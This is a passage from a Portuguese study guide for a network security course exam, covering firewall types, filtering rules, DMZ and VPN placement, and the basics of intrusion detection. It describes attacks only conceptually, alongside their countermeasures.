---
title: "ICP473: guia de estudo da P3"
place: Rio de Janeiro, Brasil
date: 2026-10-01T13:06:28-03:00
lang: pt
type: note
draft: true
epub: true
plum: false
---

<script setup>
import DrawablePen from '../../src/components/DrawablePen.vue'
</script>

<DrawablePen :cloudStorage="true" penEmoji="🖉" strokeColor="#1d4ed8" />

<DrawablePen :cloudStorage="true" penEmoji="🖉" strokeColor="#dc2626" />

<DrawablePen :cloudStorage="true" penEmoji="🖌️" strokeColor="rgba(250,204,21,0.4)" :strokeWidth="20" />

<DrawablePen :cloudStorage="true" penEmoji="🖌️" strokeColor="rgba(236,72,153,0.35)" :strokeWidth="20" />

**Prova:** data a confirmar.
**Matéria:** slides 448 a 619 (Aulas 14 a 16), mais as listas 8 e 9.

> O link no topo desta página abre a versão em inglês, que tem um glossário português para inglês.

> **Suposição de escopo.** O slide de apresentação do curso lista só P1 e P2. O aluno
> informa três provas neste período. A P1 cobriu os slides 1 a 248. Esta página supõe que a
> P2 cobre os slides 249 a 447 (modos de operação, hash, assimétrica, IPsec, TLS) e que a P3
> cobre os slides 448 a 619: Aula 14 firewalls, Aula 15 IDS/IPS, Aula 16 vulnerabilidades de
> software, com as listas 8 e 9. O deck tem 619 páginas, então 619 é o último slide.
> Cada aula é uma Parte, assim uma mudança de limite só move uma Parte.

---

[[toc]]

## 0. Plano de estudo

Estude pelos baralhos da seção 7. Abra uma Parte só para conferir um cartão errado.

### Método

1. Antes de um baralho, escreva o que lembra do tema. 2 minutos.
2. Responda cada pergunta em frases completas, com a justificativa e o número, antes de
   rolar até as respostas.
3. Marque cada cartão como acerto ou erro. Anote os códigos dos erros, por exemplo `F6 D9 V3`.
4. Refaça os erros até cada um virar acerto.
5. Comece cada sessão seguinte com todos os erros acumulados. Um acerto em uma sessão
   posterior limpa o erro.

### Horário

Sessões de 45 minutos. Um baralho por sessão. Os erros são refeitos na sessão seguinte.

| Sessão | Conteúdo                                                       |
| ------ | -------------------------------------------------------------- |
| 1      | Baralho F (firewalls). Tabelas da seção 4 da lista 8 no papel. |
| 2      | Baralho D (IDS/IPS, honeypots, Snort), depois erros.           |
| 3      | Baralho V (vulnerabilidades de software), depois erros.        |
| 4      | Números da seção 6, esqueletos da seção 8, depois erros.       |
| 5      | Simulado, seção 9. 45 minutos, sem consulta.                   |
| 6      | Corrigir o simulado com os baralhos. Refazer erros.            |
| 7      | Dia da prova, 20 minutos: seção 6 e a lista de erros.          |

Papel é necessário em F9, F10 e D17.

**Regra prática:** as questões do professor sempre dizem _justifique_.
Nomear o mecanismo não vale nada. A nota vem de duas coisas: **qual problema o mecanismo
resolve**, e **como ele falha**.

---

## 1. Mapa da matéria

| Aula | Tema                                                | Slides    |
| ---- | --------------------------------------------------- | --------- |
| 14   | Firewalls, tipos, host bastião, DMZ, VPN            | 448 a 508 |
| 15   | Intrusos, IDS/IPS, HIDS, NIDS, honeypots            | 509 a 564 |
| 16   | Vulnerabilidades de software, programação defensiva | 565 a 619 |

Listas que caem nesse intervalo:

- **Lista 8:** firewalls (Aula 14). Resolvida na seção 4.
- **Lista 9:** IDS/IPS e a regra do Snort (Aula 15). Resolvida na seção 5.
- A Aula 16 não tem lista de exercícios. O baralho V e o esqueleto de dissertativa E5 cobrem a aula.

---

## PARTE 1: Firewalls (Aula 14)

### 1.1 Por que firewalls existem

Um firewall protege um sistema local ou uma rede contra ameaças vindas da rede.
**O dilema (slide 450):** proteger os ativos internos e, ao mesmo tempo, permitir acesso
ao mundo externo (WANs e a Internet).

**Os seis estágios da evolução dos sistemas (slides 451 e 452):**

1. Sistema centralizado (mainframe com terminais conectados diretamente).
2. Redes locais (LANs) conectando PCs e terminais entre si e ao mainframe.
3. Rede de instalações: várias LANs conectando PCs, servidores e talvez mainframes.
4. Rede corporativa: várias redes de instalações, distribuídas geograficamente,
   conectadas por uma WAN privada.
5. Conectividade com a Internet: as redes de instalações conectam-se à Internet, além da WAN privada.
6. Nuvem corporativa: servidores virtualizados em data centers, fornecendo serviços internos e externos.

**Por que segurança por máquina não basta (slides 453 e 454):** uma rede com centenas ou
milhares de sistemas roda vários sistemas operacionais. Quando uma falha de segurança é
encontrada, todo sistema afetado precisa de correção. Isso exige gerência de configuração
escalável e aplicação agressiva de correções. É difícil, e em alguns casos não compensa o
custo. O firewall é a alternativa amplamente aceita, ou o complemento, à segurança baseada
no host.

### 1.2 Defesa de perímetro e objetivos de projeto

**Posição (slide 455):** entre a rede das instalações e a Internet.
**Objetivo:** um enlace controlado, uma muralha de segurança externa (o **perímetro**),
proteção contra ataques vindos da Internet.

**Ponto de gargalo:** um ponto único onde segurança e auditoria podem ser impostas.
O firewall pode ser um computador, ou dois ou mais sistemas que cooperam.
**Resultado:** defesa em profundidade, a doutrina militar clássica.
O firewall acrescenta uma camada que isola os sistemas internos.

**Os três objetivos de projeto, de [BELL94] (slide 456):**

1. **Centralização do tráfego:** todo o tráfego, nos dois sentidos, passa pelo firewall.
   Como: bloquear fisicamente todo outro caminho para a rede local.
2. **Controle de autorização:** só passa o tráfego autorizado pela política de segurança local.
   Como: a política de acesso.
3. **Imunidade do firewall:** o próprio firewall é imune a penetração.
   Como: um sistema reforçado com um sistema operacional seguro.

### 1.3 A política de acesso

**Política de acesso (slide 457):** a lista dos tipos de tráfego autorizados a passar pelo
firewall. Critérios: faixas de endereços, protocolos, aplicações, tipos de conteúdo.

**Desenvolvimento da política:** ela vem da **avaliação de risco** e da política de
segurança da informação da organização. Começa ampla (quais tipos de tráfego a organização
precisa suportar), é refinada em **elementos de filtro** específicos, e é implementada na
topologia do firewall. A política dita as regras, não o contrário.

**Quatro características pelas quais a política pode filtrar (NIST SP 800-41, slides 458 e 459):**

| Característica          | Controla o acesso por                           | Usada por                      |
| ----------------------- | ----------------------------------------------- | ------------------------------ |
| Endereço IP e protocolo | Endereços de origem e destino, portas, sentido  | Filtros de pacotes, com estado |
| Protocolo de aplicação  | Os dados autorizados do protocolo de aplicação  | Proxy de aplicação             |
| Identidade do usuário   | Quem é o usuário, tipicamente usuários internos | Exige autenticação IPsec       |
| Atividade de rede       | Hora, taxa de requisições (varredura), padrões  | Qualquer                       |

Exemplos para o protocolo de aplicação: verificar e-mail (SMTP) contra spam, ou requisições
HTTP contra sites autorizados.

### 1.4 Capacidades e limitações

**Quatro capacidades (slide 460):**

1. **Ponto de gargalo único.** Mantém usuários não autorizados fora, proíbe serviços
   vulneráveis de entrar ou sair, protege contra falsificação de IP e ataques de roteamento.
   Simplifica a gerência de segurança.
2. **Um local para monitoramento:** auditorias e alarmes.
3. **Uma plataforma para funções de Internet sem relação com segurança:** NAT (mapeia
   endereços locais em endereços de Internet) e gerência de rede (registra o uso da Internet).
4. **Uma plataforma para IPsec:** VPNs pelo modo túnel do IPsec.

**Quatro limitações (slide 461):**

1. Não protege contra ataques que o **contornam**: sistemas internos com enlace próprio a
   um provedor (banda larga móvel ou cabeada), LANs com enlaces diretos a organizações parceiras.
2. Não protege totalmente contra **ameaças internas**: um funcionário descontente, ou um
   funcionário que coopera sem saber com um atacante (phishing).
3. **LANs sem fio inseguras** podem ser alcançadas de fora. Firewalls internos não impedem
   comunicação sem fio direta entre sistemas em lados opostos do firewall.
4. **Dispositivos portáteis infectados (BYOD):** um laptop, PDA ou pen drive infectado fora
   e depois conectado dentro, carregando a ameaça.

### 1.5 Lógica de filtragem e políticas padrão

Um firewall pode monitorar o tráfego em vários níveis (slide 464): pacotes de baixo nível,
isolados ou como um fluxo; todo o tráfego dentro de uma conexão de transporte; detalhes de
protocolos de aplicação. A política de acesso decide o nível.

| Lógica de filtragem | Regra                                                   | Última regra          |
| ------------------- | ------------------------------------------------------- | --------------------- |
| **Filtro positivo** | Passa só os pacotes que atendem a critérios específicos | Um **deny** no final  |
| **Filtro negativo** | Rejeita qualquer pacote que atende a certos critérios   | Um **allow** no final |

O que o firewall examina depende do tipo: um ou mais cabeçalhos de protocolo de cada
pacote, a carga útil de cada pacote, ou o padrão de uma sequência de pacotes.

**As duas políticas padrão (slide 466):**

| Política      | Descarte padrão                                  | Encaminhamento padrão                            |
| ------------- | ------------------------------------------------ | ------------------------------------------------ |
| Lema          | "O que não é expressamente permitido é proibido" | "O que não é expressamente proibido é permitido" |
| Segurança     | Mais conservadora, mais segura                   | Reduzida                                         |
| Início        | Tudo bloqueado, serviços adicionados caso a caso | Tudo aberto                                      |
| Usuários      | Mais visível, vista como obstáculo no início     | Mais fácil para os usuários finais               |
| Administrador | Adiciona serviços sob demanda                    | Reage a cada nova ameaça conforme surge          |
| Quem usa      | Empresas e governo                               | Organizações mais abertas, como universidades    |

Um filtro de pacotes é uma lista de regras. O firewall compara os cabeçalhos IP e TCP de
cada pacote com a lista, de cima para baixo. Em caso de correspondência, a ação da regra
executa (encaminhar ou descartar). Sem correspondência, a ação padrão executa.

### 1.6 Tipo 1: firewall de filtragem de pacotes

**Definição (slide 465):** aplica um conjunto de regras a cada pacote IP, de entrada e de
saída, e o encaminha ou descarta. As regras usam informação das camadas 3 e 4:

1. Endereço IP de origem.
2. Endereço IP de destino.
3. Porta de origem e de destino (TCP ou UDP), que identifica a aplicação (SNMP, HTTP).
4. Campo de protocolo IP: o protocolo de transporte (TCP, UDP, ICMP).
5. Interface: em firewalls com três ou mais portas, de qual interface o pacote veio
   ou para qual vai.

**Tabela 9.1, o exemplo SMTP (slides 467 e 468).** Objetivo: permitir e-mail de entrada e
de saída (SMTP, porta 25), bloquear todo o resto.

| Regra | Sentido | End. origem | End. destino | Protocolo | Porta destino | Ação   |
| ----- | ------- | ----------- | ------------ | --------- | ------------- | ------ |
| 1     | Entrada | Externo     | Interno      | TCP       | 25            | Permit |
| 2     | Saída   | Interno     | Externo      | TCP       | > 1023        | Permit |
| 3     | Saída   | Interno     | Externo      | TCP       | 25            | Permit |
| 4     | Entrada | Externo     | Interno      | TCP       | > 1023        | Permit |
| 5     | Ambos   | Qualquer    | Qualquer     | Qualquer  | Qualquer      | Deny   |

A regra 1 permite correio de entrada, a regra 2 a resposta a ele, a regra 3 correio de
saída, a regra 4 a resposta a ele. A regra 5 é a política padrão, sempre a última, explícita
ou implícita.

**A falha:** a regra 4 é permissiva demais. Ela permite tráfego externo para **qualquer**
porta de destino acima de 1023, supondo que é uma resposta.

**A exploração (slide 469):** um atacante externo abre uma conexão da porta 5150 para um
proxy web interno na porta 8080. A regra 4 permite, porque 8080 está acima de 1023.

**Primeiro refinamento:** acrescentar a **porta de origem** às regras. As regras 2 e 4
(respostas) recebem porta de origem 25, porque a resposta a um e-mail vem da porta 25 do
servidor. As regras 1 e 3 (novas conexões) recebem porta de origem > 1023, porque um cliente
que inicia uma conexão de correio usa uma porta alta.

**A vulnerabilidade restante (slide 470):** a porta 25 para SMTP é só um padrão. Um atacante
externo pode rodar outra aplicação na porta 25 e enviar pacotes **da porta de origem 25**
para máquinas internas. A regra 4 revisada os aceita como respostas.

**A solução: o flag ACK (slides 471 e 472).** A regra 4 também exige o flag ACK ligado.
Um pacote que pertence a uma conexão TCP estabelecida, como uma resposta SMTP legítima,
sempre tem ACK ligado. Um pacote que inicia uma nova conexão tem SYN e não tem ACK.

| Regra | Sentido | End. origem | Porta origem | End. destino | Protocolo | Porta destino | Flag | Ação   |
| ----- | ------- | ----------- | ------------ | ------------ | --------- | ------------- | ---- | ------ |
| 4     | Entrada | Externo     | 25           | Interno      | TCP       | > 1023        | ACK  | Permit |

**Três vantagens (slide 473):** simplicidade (lógica de regras sobre cabeçalhos L3 e L4),
transparência (nenhuma configuração no cliente), velocidade (sem inspeção da carga útil).

**Cinco fraquezas, NIST SP 800-41 (slides 474 e 475):**

1. **Sem dados das camadas superiores.** Não impede ataques que usam vulnerabilidades
   específicas da aplicação. Se a aplicação é permitida, todas as suas funções são permitidas.
2. **Registro limitado.** O log guarda só o que foi usado na decisão: endereços e tipo de
   tráfego.
3. **Sem autenticação avançada de usuário.** Mesma causa: sem funcionalidade das camadas
   superiores.
4. **Vulnerável a ataques na pilha TCP/IP**, como falsificação de endereço na camada de rede.
   Muitos filtros não detectam endereçamento alterado na camada 3.
5. **Sujeito a erro de configuração.** Poucas variáveis na decisão tornam fácil permitir
   tráfego que deveria ser negado.

**Dois ataques e suas contramedidas (slides 476 e 477):**

- **Falsificação de endereço IP.** O intruso envia pacotes de fora com o endereço de origem
  de um host interno confiável, para penetrar sistemas que confiam em endereços internos.
  Contramedida: descartar qualquer pacote que chega na interface externa com endereço de
  origem interno.
- **Ataque de fragmento minúsculo.** O intruso usa a fragmentação IP para empurrar o
  cabeçalho TCP, com as portas, para um segundo fragmento. O primeiro fragmento contém só o
  cabeçalho IP. O filtro decide pelo primeiro fragmento, e o atacante espera que o resto passe.
  Contramedida: exigir uma quantidade mínima do cabeçalho de transporte no primeiro
  fragmento. Se o primeiro fragmento é rejeitado, lembrar o ID do pacote e descartar os
  fragmentos seguintes.

**O problema de raiz: falta de contexto (slide 478).** Um filtro sem estado decide pacote a
pacote e ignora se uma conexão TCP existe. Um servidor usa uma porta bem conhecida fixa
abaixo de 1024 (SMTP: 25). Um cliente usa uma porta temporária dinâmica acima de 1024 (por
exemplo 49152). Para permitir a resposta da porta 25 para a porta 49152, o filtro precisa
abrir **todas** as portas altas (> 1023) na entrada. Isso é uma vulnerabilidade enorme.

### 1.7 Tipo 2: firewall de inspeção com estado

**A solução (slide 479):** apertar as regras para o tráfego TCP. O firewall cria e mantém
uma **tabela de estado** (Tabela 9.2) das conexões TCP de saída que estão ativas, uma
entrada por conexão estabelecida. Tráfego de entrada para portas altas é permitido **só** se
o pacote corresponde a uma das entradas.

Tabela 9.2, linhas de exemplo (slide 481):

| Endereço de origem | Porta de origem | Endereço de destino | Porta de destino | Estado       |
| ------------------ | --------------- | ------------------- | ---------------- | ------------ |
| 192.168.1.100      | 1030            | 210.9.88.29         | 80               | Estabelecida |
| 192.168.1.101      | 1033            | 173.66.32.122       | 25               | Estabelecida |
| 192.168.1.106      | 1035            | 177.231.32.12       | 79               | Estabelecida |
| 223.43.21.231      | 1990            | 192.168.1.6         | 80               | Estabelecida |

**Capacidades (slide 480):** revisa os mesmos cabeçalhos L3 e L4 que um filtro de pacotes,
**e** registra o estado da conexão TCP (estabelecida, encerrando). Recursos avançados em
alguns produtos: **rastreamento do número de sequência TCP**, contra ataques como sequestro
de sessão; **inspeção limitada de aplicação (DPI)**, útil para protocolos problemáticos
(FTP, IM, SIPS) para identificar e rastrear conexões de dados relacionadas.

### 1.8 Tipo 3: proxy de aplicação (application-level gateway)

**Mecanismo (slide 482):** um retransmissor de tráfego de nível de aplicação (Telnet, FTP).
O usuário contata o gateway. O gateway pede o host remoto e as credenciais. Se válidas, o
próprio gateway contata a aplicação no host remoto e retransmite os segmentos TCP entre os
dois extremos. Existem duas conexões **emendadas**: cliente ao gateway, e gateway ao
servidor. Não há conexão fim a fim.

**Propriedades (slide 483):**

- **Controle granular.** Se o gateway não tem código de proxy para uma aplicação, o serviço
  não é suportado. Ele pode suportar só recursos específicos de uma aplicação, por exemplo
  permitir HTTP GET e negar POST.
- **Mais seguro que filtros de pacotes.** Analisa umas poucas aplicações permitidas em vez
  de incontáveis combinações de IP, porta e flags.
- **Auditoria.** Fácil registrar e auditar todo o tráfego no nível de aplicação.
- **Desvantagem: sobrecarga de processamento.** Examina e encaminha todo o tráfego nas duas
  conexões emendadas.

### 1.9 Tipo 4: proxy de circuito (circuit-level gateway) e SOCKS

**Mecanismo (slide 484):** um sistema autônomo ou uma função especializada de um proxy de
aplicação. Não permite uma conexão TCP fim a fim. Estabelece duas conexões TCP: host interno
ao gateway, e gateway ao host externo.
**Diferença principal:** uma vez que as conexões existem, ele retransmite segmentos TCP
**sem examinar a carga útil**. A função de segurança é só decidir quais conexões são permitidas.

**Uso híbrido típico:** quando o administrador confia nos usuários internos. A entrada usa um
proxy de aplicação (caro, seguro). A saída usa um proxy de circuito (barato), porque examinar
os dados de saída não compensa o processamento.

**SOCKS versão 5, RFC 1928 (slides 485 e 486):** um arcabouço para aplicações cliente-servidor
(TCP e UDP) usarem os serviços de um firewall de forma conveniente e segura.
É uma **camada intermediária** entre a camada de aplicação e a camada de transporte. Não é
um gateway de camada de rede, então não encaminha ICMP.

Componentes: o **servidor SOCKS** no firewall (UNIX, Windows), a **biblioteca cliente SOCKS**
nos hosts internos protegidos, e **clientes "SOCKS-ificados"** (FTP, Telnet) recompilados ou
religados com a biblioteca.

Fluxo TCP:

1. O cliente interno abre uma conexão TCP com o servidor SOCKS na **porta 1080**.
2. O cliente negocia o método de autenticação.
3. O cliente se autentica.
4. O cliente envia uma requisição de retransmissão ("conectar ao IP 1.2.3.4, porta 80").
5. O servidor SOCKS avalia a requisição e, se permitida, abre a conexão externa.

UDP: uma conexão TCP com a porta 1080 é aberta primeiro, só para autenticar o usuário. Os
segmentos UDP são então retransmitidos enquanto essa conexão de controle fica aberta.

### 1.10 Os quatro tipos comparados

| Tipo                           | Camada     | Examina                             | Estado | Carga útil | Custo   |
| ------------------------------ | ---------- | ----------------------------------- | ------ | ---------- | ------- |
| Filtro de pacotes (sem estado) | L3, L4     | Cabeçalhos de cada pacote           | Não    | Não        | O menor |
| Inspeção com estado            | L3, L4     | Cabeçalhos mais o estado da conexão | Sim    | Limitada   | Baixo   |
| Proxy de circuito              | Transporte | Quais conexões são permitidas       | Sim    | Não        | Médio   |
| Proxy de aplicação             | Aplicação  | Comandos e conteúdo da aplicação    | Sim    | Sim        | O maior |

### 1.11 Base do firewall: host bastião e outras plataformas

**Plataformas (slide 487):** uma máquina dedicada autônoma com um SO comum (UNIX, Linux),
ou um appliance de segurança pré-configurado. Alternativas: um módulo de software em um
roteador, um switch de LAN ou um servidor.

**Host bastião (slide 488):** um sistema identificado pelo administrador do firewall como
um **ponto forte crítico** da segurança da rede. Serve como plataforma para proxies de
aplicação ou de circuito, e pode suportar outros serviços (IPsec). Seu hardware roda uma
versão segura do seu SO: um **sistema reforçado**.

**Características (slides 489 a 492):**

1. **Serviços mínimos:** só os serviços que o administrador considera essenciais são
   instalados, por exemplo proxies para DNS, FTP, HTTP e SMTP.
2. **Autenticação extra:** o host pode exigir autenticação antes dos proxies, e cada proxy
   pode exigir a sua própria.
3. **Subconjunto de comandos:** cada proxy suporta só um subconjunto dos comandos da aplicação.
4. **Hosts restritos:** cada proxy permite acesso só a hosts internos específicos.
5. **Registro detalhado:** cada proxy registra todo o tráfego, cada conexão e sua duração.
   Uma ferramenta essencial para descobrir e deter ataques.
6. **Software pequeno:** cada proxy é um pacote muito pequeno projetado para segurança. Uma
   aplicação de correio UNIX tem mais de 20.000 linhas; um proxy de correio tem menos de
   1.000. Mais fácil de auditar.
7. **Independência:** os proxies são independentes. Um vulnerável é desinstalado sem afetar
   os outros. Um novo serviço é um novo proxy.
8. **Sem acesso a disco:** um proxy lê só seu arquivo de configuração inicial. As partes
   executáveis do sistema de arquivos podem ser somente leitura, o que dificulta cavalos de
   Troia e sniffers.
9. **Sem privilégios:** cada proxy roda como usuário sem privilégios em um diretório
   privado seguro.

**Firewalls baseados em host (slide 493):** um módulo de software que protege um host, no SO
ou como complemento, comumente em um servidor. Três vantagens: regras ajustadas ao host;
proteção independente da topologia (ataques internos e externos passam pelo firewall do
host); uma camada adicional, assim novos servidores entram na rede sem mudar o firewall de rede.

**Firewalls em dispositivos de rede (slide 494):** filtragem de pacotes e inspeção com estado
em roteadores e switches, como camadas adicionais junto com hosts bastião e firewalls de host.

**Firewalls virtuais (slide 495):** em ambientes virtualizados, ou um appliance virtual (um
host bastião como VM) ou capacidades de firewall no hipervisor.

**Firewalls pessoais (slides 497 a 500):** controlam o tráfego entre um computador pessoal e
a rede, em casa ou em intranets corporativas. Implementados como módulo de software no PC,
ou no roteador doméstico conectado ao modem DSL ou a cabo. Muito mais simples que firewalls
de servidor ou autônomos. Função principal: negar acesso remoto não autorizado. Função
secundária: monitorar a atividade de saída para detectar malware como worms. Implementações:
**netfilter** (Linux), **pf** (BSD e macOS), **Windows Firewall**. Configurados por CLI ou GUI.

Política padrão: conexões de entrada negadas, exceto as que o usuário permite; saída
permitida. Serviços que podem ser reabilitados, com portas: SSH 22, FTP 20 e 21,
compartilhamento Windows 139, SMB sem NetBIOS 445, VNC 5900 a 5902, Network Time 123,
compartilhamento de impressora 631 e 515, compartilhamento web pessoal 80 e 427, CVS 2401,
IRC 194.

**A regra do FTP:** habilitar FTP abre as portas 20 e 21 localmente. Se outros conectam a
partir das portas 20 ou 21, as portas 1024 a 65535 abrem para a conexão de dados do FTP.

**Recursos avançados:** **modo furtivo** (descarta pacotes não solicitados para o sistema
parecer ausente), **bloqueio de UDP** (só TCP para portas abertas), **registro**, **filtro de
aplicação** (só aplicações selecionadas, ou aplicações assinadas por uma CA válida, podem
fornecer serviços).

### 1.12 Localizações: DMZ, VPN e firewalls distribuídos

**DMZ (slides 502 e 503):** um segmento de rede extra entre um **firewall externo** na borda
da rede (logo depois do roteador de borda da Internet ou da WAN) e um ou mais **firewalls
internos** que protegem a maior parte da rede corporativa. A DMZ contém sistemas que
precisam ser alcançáveis de fora mas ainda precisam de proteção: o site corporativo, o
servidor de e-mail (SMTP), o servidor DNS. A Figura 9.2 (slide 496) mostra roteador de
borda, firewall externo, DMZ com servidores web, e-mail e DNS, firewall interno, depois
servidores de aplicação e de banco de dados e estações de trabalho.

O firewall externo dá controle de acesso moderado aos sistemas da DMZ e proteção básica ao
resto. **Três propósitos do firewall interno:**

1. Filtragem mais estrita que a do externo, para proteger servidores e estações internos.
2. Proteção nos dois sentidos em relação à DMZ: protege a rede interna de um servidor da DMZ
   comprometido (malware, rootkits, bots), e protege a DMZ da rede interna.
3. Segmentação interna: vários firewalls internos protegem porções da rede interna umas das
   outras (servidores contra estações de trabalho).

**VPN (slides 504 a 506):** organizações com LANs dispersas precisam interconectá-las. A
Internet pública é mais barata e mais fácil de gerenciar que linhas privadas, mas expõe o
tráfego corporativo (escuta, acesso não autorizado). Uma VPN é um conjunto de computadores
interconectados por uma rede insegura, usando criptografia e autenticação nas camadas
inferiores de protocolo, com o mesmo sistema criptográfico nos dois extremos. O protocolo
mais comum é o **IPsec**.

O dispositivo IPsec (roteador ou firewall) cifra e comprime todo o tráfego para a WAN, e
decifra e descomprime todo o tráfego vindo dela, de forma transparente para os hosts da LAN.
Um usuário individual remoto pode rodar IPsec na estação de trabalho, que então precisa de
alta segurança de host, o que a torna um alvo atraente.

**Onde colocar o IPsec:**

| Posição                     | Problema                                                            |
| --------------------------- | ------------------------------------------------------------------- |
| Atrás do firewall (interno) | Tráfego VPN cifrado: sem filtragem, varredura, registro ou controle |
| No roteador de borda        | O roteador é provavelmente menos seguro que o firewall              |
| **No próprio firewall**     | A escolha funcional                                                 |

**Firewalls distribuídos (slide 507):** firewalls de rede autônomos mais firewalls baseados
em host em servidores e estações de trabalho, trabalhando juntos sob **controle
administrativo central**. Os administradores configuram centenas de firewalls de host e
firewalls pessoais, locais e remotos, e monitoram a segurança por toda a rede. Vantagens:
proteção contra ataques internos, e proteção ajustada a máquinas e aplicações específicas.

Material externo:

- NIST CSRC, artigo: [SP 800-41 Rev. 1, Guidelines on Firewalls and Firewall Policy](https://csrc.nist.gov/pubs/sp/800/41/r1/final)
  A publicação que os slides citam para as características da política e as fraquezas do filtro de pacotes.
- IETF, artigo: [RFC 1928, SOCKS Protocol Version 5](https://www.rfc-editor.org/rfc/rfc1928)
  O padrão do proxy de circuito, com o handshake da porta 1080.

---

## PARTE 2: Detecção e prevenção de intrusão (Aula 15)

### 2.1 Intrusos

Intrusos são uma das principais ameaças (slide 510). A maioria das violações vem de
**externos**, algumas de **internos**, e os internos podem ser muito mais perigosos. Ataques
direcionados podem contornar as defesas de perímetro (firewalls), então defesa em
profundidade é necessária.

**Quatro classes de intruso (slides 511 e 512):**

1. **Criminosos cibernéticos.** Motivação: recompensa financeira. Atividades: roubo de
   identidade, roubo de credenciais financeiras, espionagem corporativa, roubo ou resgate
   de dados. Organizam-se em fóruns clandestinos (DarkMarket) para negociar dados e
   coordenar ataques.
2. **Ativistas.** Motivação: causas sociais ou políticas. Nível de habilidade muitas vezes
   baixo. Atividades: pichação de site, DoS, vazamento de dados. Exemplos: Anonymous,
   LulzSec, Manning, Snowden.
3. **APTs (ameaças persistentes avançadas).** Grupos de hackers patrocinados por governos.
   Motivação: espionagem ou sabotagem. O nome vem do sigilo e da persistência por longos
   períodos. Difundidos: China, Rússia, EUA, Reino Unido.
4. **Outros.** Hackers clássicos, motivados pelo desafio técnico ou pela reputação no
   grupo; descobrem novas vulnerabilidades, como estouro de buffer. Hackers amadores usam
   kits de ataque prontos e podem ser recrutados pelas outras classes.

**Exemplos de intrusão, NIST SP 800-61 (slides 513 e 514):** comprometimento remoto de root
de um servidor de correio; pichação de servidor web; adivinhar e quebrar senhas; copiar um
banco de dados de números de cartão de crédito; ver dados sensíveis (folha de pagamento,
prontuários médicos) sem autorização; rodar um sniffer de pacotes em uma estação para
capturar nomes de usuário e senhas; usar um erro de permissão em um servidor FTP anônimo
para distribuir software e música piratas; acessar um sistema inseguro para alcançar a rede
interna; engenharia social.

### 2.2 Papel e limites de IDS e IPS

**IDS:** sistema de detecção de intrusão. **IPS:** sistema de prevenção de intrusão (slide 515).

- **Onde funcionam bem:** razoavelmente eficazes contra ataques conhecidos, menos
  sofisticados, por exemplo grupos ativistas ou golpes de e-mail em larga escala.
- **Onde falham:** menos eficazes contra ataques direcionados sofisticados, de criminosos
  cibernéticos ou APTs patrocinadas por estados, porque esses atacantes usam **exploits de
  dia zero** e sabem esconder sua atividade no sistema.
- **Defesa em profundidade:** o IDS/IPS precisa fazer parte de uma estratégia que inclui
  criptografia, trilhas de auditoria, autenticação forte e gerência ativa de segurança.

### 2.3 A metodologia de ataque

O comportamento do intruso muda constantemente, mas existe uma metodologia comum (slide 516):
**phishing, instalação de malware, roubo de credenciais, comprometimento.** Seis passos:

1. **Aquisição do alvo e coleta de informação** (slides 516 e 519). OSINT (inteligência de
   fontes abertas), informação pública, ferramentas de mapeamento de rede. Objetivo:
   identificar e caracterizar os sistemas alvo. Exemplos: explorar o site corporativo
   (estrutura, equipe, SO); consulta DNS (dig, host) e WHOIS; mapear serviços com NMAP;
   enviar um e-mail de sondagem (ao atendimento) para analisar o cliente e o servidor de
   correio; identificar serviços vulneráveis como um CMS web.
2. **Acesso inicial.** Explorar uma vulnerabilidade remota de rede, explorar credenciais
   fracas, ou instalar malware por engenharia social ou download direcionado. Exemplos:
   força bruta na senha do CMS; explorar um plugin do CMS; e-mail de spear-phishing
   direcionado com link para um exploit de navegador.
3. **Escalação de privilégio** (slides 517 e 520). Ações dentro do sistema após o acesso
   inicial, explorando vulnerabilidades de acesso local para elevar os privilégios do
   atacante. Exemplos: varrer o sistema em busca de aplicações com exploits locais; explorar
   um para obter root ou admin; instalar sniffers para capturar senhas de administrador;
   usá-las para alcançar informação privilegiada.
4. **Coleta de informação ou exploração do sistema.** Acessar ou modificar informação e
   recursos; possivelmente mover-se para outro alvo (movimentação lateral). Exemplos: varrer
   arquivos em busca de dados financeiros ou PII; transferir muitos documentos para um
   repositório externo (exfiltração); usar senhas capturadas em outros servidores.
5. **Manutenção do acesso** (slides 518 e 521). Persistência: backdoors ou outro malware,
   credenciais de autenticação secretas, outras mudanças de configuração. Exemplos: instalar
   uma ferramenta de administração remota (RAT) ou um rootkit com backdoor; reusar a senha
   de admin capturada depois; modificar ou desabilitar antivírus ou IDS no sistema.
6. **Apagar rastros.** Desabilitar ou editar logs de auditoria para remover evidências;
   rootkits escondem arquivos e código. Exemplos: esconder o RAT e os sniffers com um
   rootkit; editar arquivos de log para remover as entradas geradas durante a intrusão.

### 2.4 Definições e componentes de um IDS

- **Intrusão de segurança (slide 522):** um ato não autorizado de contornar os mecanismos
  de segurança de um sistema.
- **Detecção de intrusão:** uma função de hardware ou software que coleta e analisa
  informação de várias áreas dentro de um computador ou rede, para identificar possíveis
  intrusões de segurança.

**Três componentes lógicos (slide 523):**

1. **Sensores** coletam dados. A entrada pode ser qualquer parte do sistema que contém
   evidência de intrusão: pacotes de rede, arquivos de log, chamadas de sistema. Eles
   encaminham ao analisador.
2. **Analisadores** recebem entrada de um ou mais sensores e decidem se uma intrusão
   ocorreu. A saída pode incluir evidências e orientação sobre ações. Os dados dos sensores
   podem ser armazenados para análise posterior.
3. **Interface de usuário** permite ao administrador ver o sistema ou controlar seu comportamento.

**Arquitetura (slide 524):** simples (um sensor e um analisador, um HIDS ou um NIDS) ou
distribuída (vários sensores em hosts e dispositivos de rede alimentando um analisador central).

**Classificação pela fonte de dados:**

| Tipo                   | Monitora                                             | Exemplos                  |
| ---------------------- | ---------------------------------------------------- | ------------------------- |
| HIDS (baseado em host) | Um host: suas características e os eventos nele      | PIDs, chamadas de sistema |
| NIDS (baseado em rede) | O tráfego de segmentos ou dispositivos específicos   | Tráfego suspeito          |
| Distribuído ou híbrido | Vários sensores HIDS e NIDS em um analisador central | Melhor identificação      |

**IPS:** os slides definem o IPS pelo sensor em linha (slide 552): um sensor pelo qual o
tráfego precisa passar, de modo que ele pode **bloquear** um ataque ao detectá-lo. O IDS
detecta e alerta; o IPS também previne.

### 2.5 Motivações, a suposição fundamental e o compromisso

**Três motivações (slide 525):**

1. **Detecção rápida.** Detectado cedo o bastante, o intruso é expulso antes do dano. Mesmo
   quando não a tempo de impedir, detecção mais cedo significa menos dano e recuperação mais rápida.
2. **Efeito dissuasório.** Um IDS eficaz desencoraja ataques, o que previne intrusões.
3. **Coleta de informação.** Dados sobre técnicas de intrusão fortalecem a prevenção
   (regras de firewall, correções).

**A suposição fundamental (slide 526):** o comportamento de um intruso difere do
comportamento de um usuário legítimo de formas que podem ser quantificadas. Não há uma
